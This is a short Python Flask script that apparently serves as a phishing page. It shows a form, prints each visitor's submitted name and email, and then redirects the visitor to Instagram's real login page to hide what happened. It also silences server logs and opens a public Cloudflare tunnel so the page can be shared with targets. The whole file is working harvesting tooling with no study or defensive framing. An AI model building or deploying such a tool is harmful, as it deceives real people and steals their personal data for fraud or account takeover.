import logging
from flask import Flask, request, render_template, redirect
import subprocess
import threading
import time
import re
import os
import signal
import sys

# Suppress Flask and Werkzeug logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Suppress flask CLI banner
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        name = request.form["name"]
        email = request.form["email"]
        print(f"✅ Received data: Name = {name}, Email = {email}")
        return redirect("https://www.instagram.com/accounts/login/")
    return render_template("index.htm")

def run_server():
    app.run(port=5000, debug=False, use_reloader=False)

def start_tunnel():
    print("🌐 Starting Cloudflare Tunnel...")
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    # Wait for the public URL
    public_url = None
    for line in proc.stdout:
        if "trycloudflare.com" in line:
            match = re.search(r"https://[-a-zA-Z0-9@:%._+~#=]{1,256}\.trycloudflare\.com", line)
            if match:
                public_url = match.group(0)
                print(f"🌍 Public URL: {public_url}")
                break

    return proc

if __name__ == "__main__":
    try:
        # Start Flask server in a separate thread
        flask_thread = threading.Thread(target=run_server)
        flask_thread.start()

        # Start Cloudflare tunnel
        tunnel_proc = start_tunnel()

        # Wait for Flask thread to finish
        flask_thread.join()

    except KeyboardInterrupt:
        print("\n🛑 Shutting down server and tunnel...")

        # Kill the tunnel
        if tunnel_proc:
            tunnel_proc.terminate()
            tunnel_proc.wait()

        os._exit(0)
